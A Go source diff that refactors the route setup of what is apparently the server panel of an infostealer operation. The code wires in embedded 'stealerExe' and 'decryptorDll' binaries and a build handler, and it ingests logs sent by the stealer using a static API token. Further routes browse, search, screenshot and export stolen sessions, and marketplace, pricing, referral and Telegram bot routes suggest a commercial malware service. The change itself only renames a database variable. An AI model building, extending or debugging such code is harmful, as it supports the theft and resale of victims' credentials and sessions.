@@ -37,35 +37,35 @@ func AuthMiddleware(secret string) func(http.Handler) http.Handler {
 	}
 }
 
-func SetupRoutes(r chi.Router, db *sql.DB, jwtSecret string, _ string, hub *ws.Hub, stealerExe, decryptorDll []byte, provider db.ProviderType) {
-	authHandler := NewAuthHandler(db, jwtSecret, provider)
-	usersHandler := NewUsersHandler(db, jwtSecret, provider)
-	statsHandler := NewStatsHandler(db, hub, provider)
-	logProc := services.NewLogProcessor(db, hub, provider)
+func SetupRoutes(r chi.Router, sqlDB *sql.DB, jwtSecret string, _ string, hub *ws.Hub, stealerExe, decryptorDll []byte, provider db.ProviderType) {
+	authHandler := NewAuthHandler(sqlDB, jwtSecret, provider)
+	usersHandler := NewUsersHandler(sqlDB, jwtSecret, provider)
+	statsHandler := NewStatsHandler(sqlDB, hub, provider)
+	logProc := services.NewLogProcessor(sqlDB, hub, provider)
 	logsHandler := NewLogsHandler(logProc, provider)
-	sessionsHandler := NewSessionsHandler(db, provider)
-	searchHandler := NewSearchHandler(db, provider)
-	buildHandler := NewBuildHandler(services.NewBuildService(), stealerExe, decryptorDll, db, provider)
-	notesHandler := NewNotesHandler(db, provider)
-	exportHandler := NewExportHandler(db, provider)
-	settingsHandler := NewSettingsHandler(db, jwtSecret, provider)
-	restoreHandler := NewRestoreHandler(db, provider)
-	chatHandler := NewChatHandler(db, hub, provider)
-	ticketHandler := NewTicketHandler(db, provider)
-	marketplaceHandler := NewMarketplaceHandler(db, provider)
-	totpHandler := NewTOTPHandler(db, provider)
-	sessMgmtHandler := NewSessionMgmtHandler(db, provider)
-	apiKeyHandler := NewAPIKeyHandler(db, provider)
+	sessionsHandler := NewSessionsHandler(sqlDB, provider)
+	searchHandler := NewSearchHandler(sqlDB, provider)
+	buildHandler := NewBuildHandler(services.NewBuildService(), stealerExe, decryptorDll, sqlDB, provider)
+	notesHandler := NewNotesHandler(sqlDB, provider)
+	exportHandler := NewExportHandler(sqlDB, provider)
+	settingsHandler := NewSettingsHandler(sqlDB, jwtSecret, provider)
+	restoreHandler := NewRestoreHandler(sqlDB, provider)
+	chatHandler := NewChatHandler(sqlDB, hub, provider)
+	ticketHandler := NewTicketHandler(sqlDB, provider)
+	marketplaceHandler := NewMarketplaceHandler(sqlDB, provider)
+	totpHandler := NewTOTPHandler(sqlDB, provider)
+	sessMgmtHandler := NewSessionMgmtHandler(sqlDB, provider)
+	apiKeyHandler := NewAPIKeyHandler(sqlDB, provider)
 	docsHandler := NewDocsHandler()
-	publicStatsHandler := NewPublicStatsHandler(db, provider)
-	pricingHandler := NewPricingHandler(db, provider)
-	referralHandler := NewReferralHandler(db, provider)
+	publicStatsHandler := NewPublicStatsHandler(sqlDB, provider)
+	pricingHandler := NewPricingHandler(sqlDB, provider)
+	referralHandler := NewReferralHandler(sqlDB, provider)
 	systemHealthHandler := NewSystemHealthHandler()
 
-	telegramBotHandler := NewTelegramBotHandler(db, provider)
-	teamHandler := NewTeamHandler(db, provider)
-	auditHandler := NewAuditHandler(db, provider)
-	banAPIHandler := NewBanHandler(db, provider)
+	telegramBotHandler := NewTelegramBotHandler(sqlDB, provider)
+	teamHandler := NewTeamHandler(sqlDB, provider)
+	auditHandler := NewAuditHandler(sqlDB, provider)
+	banAPIHandler := NewBanHandler(sqlDB, provider)
 	r.Group(func(r chi.Router) {
 		r.Post("/api/auth/login", authHandler.Login)
 		r.Post("/api/auth/register", usersHandler.Register)
@@ -79,7 +79,7 @@ func SetupRoutes(r chi.Router, db *sql.DB, jwtSecret string, _ string, hub *ws.H
 
 	// Log ingestion — protected by API key (static token from stealer), not JWT
 	r.Group(func(r chi.Router) {
-		r.Use(middleware.APIKeyAuth(db))
+		r.Use(middleware.APIKeyAuth(sqlDB))
 
 		r.Post("/api/log", logsHandler.Ingest)
 		r.Post("/api/log/chunk", logsHandler.Chunk)
@@ -123,18 +123,18 @@ func SetupRoutes(r chi.Router, db *sql.DB, jwtSecret string, _ string, hub *ws.H
 		r.Get("/api/search", searchHandler.Search)
 		r.Get("/api/search/advanced", searchHandler.AdvancedSearch)
 
-		detectHandler := NewDuplicateDetectHandler(db, provider)
+		detectHandler := NewDuplicateDetectHandler(sqlDB, provider)
 		r.Get("/api/detect/duplicates", detectHandler.Detect)
 
-		domainDetectHandler := NewDomainDetectHandler(db, provider)
+		domainDetectHandler := NewDomainDetectHandler(sqlDB, provider)
 		r.Get("/api/domain-detect", domainDetectHandler.List)
 		r.Post("/api/domain-detect", domainDetectHandler.Create)
 		r.Delete("/api/domain-detect/{id}", domainDetectHandler.Delete)
 		r.Post("/api/sessions/{id}/auto-tag", domainDetectHandler.AutoTag)
 
-		r.Get("/api/filter-presets", NewFilterPresetsHandler(db, provider).List)
+		r.Get("/api/filter-presets", NewFilterPresetsHandler(sqlDB, provider).List)
 
-		screenshotsHandler := NewScreenshotsHandler(db, provider)
+		screenshotsHandler := NewScreenshotsHandler(sqlDB, provider)
 		r.Get("/api/sessions/{id}/screenshot", screenshotsHandler.Get)
 		r.With(middleware.RequireRole("admin")).Delete("/api/sessions/{id}/screenshot", screenshotsHandler.Delete)
 
@@ -204,11 +204,11 @@ func SetupRoutes(r chi.Router, db *sql.DB, jwtSecret string, _ string, hub *ws.H
 		store := services.NewSettingsStore(
 			func(key string) (string, error) {
 				var val string
-				err := db.QueryRow("SELECT value FROM settings WHERE key = ?", key).Scan(&val)
+				err := db.QueryRow(sqlDB, provider, "SELECT value FROM settings WHERE key = ?", key).Scan(&val)
 				return val, err
 			},
 			func(key, value string) error {
-				_, err := db.Exec("INSERT INTO settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value", key, value)
+				_, err := db.Exec(sqlDB, provider, "INSERT INTO settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value", key, value)
 				return err
 			},
 		)
